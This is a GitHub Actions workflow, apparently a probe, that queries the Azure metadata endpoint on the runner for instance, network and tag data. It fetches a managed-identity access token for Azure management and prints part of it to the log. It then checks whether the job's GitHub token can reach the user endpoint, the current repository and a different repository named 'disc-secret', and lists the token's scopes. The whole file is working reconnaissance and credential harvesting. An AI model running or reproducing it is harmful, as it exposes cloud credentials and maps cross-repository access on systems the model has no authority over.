name: azure-imds-probe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  imds:
    runs-on: ubuntu-latest
    steps:
      - name: probe-imds
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "=== Azure IMDS Instance Metadata ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-12-13" --max-time 5 | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps({k:d.get(k,'N/A') for k in ['compute']}, indent=2)[:2000])" 2>/dev/null || echo "IMDS_INSTANCE_FAILED"
          
          echo ""
          echo "=== Azure IMDS Managed Identity Token ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" --max-time 5 2>/dev/null | head -c 500
          echo ""
          
          echo ""
          echo "=== IMDS Network ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance/network?api-version=2021-12-13" --max-time 5 2>/dev/null | head -c 500
          echo ""
          
          echo ""
          echo "=== IMDS Tags ==="
          curl -sS -H "Metadata:true" "http://169.254.169.254/metadata/instance/compute/tagsList?api-version=2021-12-13" --max-time 5 2>/dev/null | head -c 500
          echo ""
          
          echo ""
          echo "=== GITHUB_TOKEN test (correct way) ==="
          echo -n "REST /user: "
          curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/user"
          echo ""
          echo -n "REST /repos/current: "
          curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$GITHUB_REPOSITORY"
          echo ""
          echo -n "REST /repos/cross-repo: "
          curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/toofikz4/disc-secret"
          echo ""
          echo "Scopes:"
          curl -sI -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/" | grep -i x-oauth-scopes